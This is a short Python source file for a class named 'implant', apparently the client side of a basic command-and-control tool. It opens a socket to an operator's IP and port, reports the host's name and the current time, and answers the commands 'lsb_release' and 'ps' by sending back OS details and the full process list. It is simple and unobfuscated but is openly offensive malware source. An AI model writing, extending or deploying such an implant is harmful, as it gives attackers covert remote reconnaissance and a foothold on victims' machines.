#!/bin/python3
import socket
import datetime
import json
import time
import subprocess
class implant:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def connect(self):
        self.sock = socket.create_connection((self.ip, self.port))

    def communicate(self):
        while True:
            data = self.sock.recv(1024)
            print(f"Recieved {data.decode()}")
            if data.decode() == "test":
                print("Sending synack...")
                time.sleep(1)
                self.sock.send("synack".encode())
            elif data.decode() == "lsb_release":
                data = subprocess.check_output(['lsb_release', '-a'])
                self.sock.send(data)
            elif data.decode() == "ps":
                data = subprocess.check_output(['ps', '-ef'])
                self.sock.send(data)

    def intro(self):

        time_info = datetime.datetime.now()
        self.implant_info = {
        "hostname" : socket.gethostname(),
        "date" : f"{time_info.day}/{time_info.month}/{time_info.year}",
        "time" : f"{time_info.hour}:{time_info.minute}:{time_info.second}"
        }
        self.sock.send(json.dumps(self.implant_info).encode())

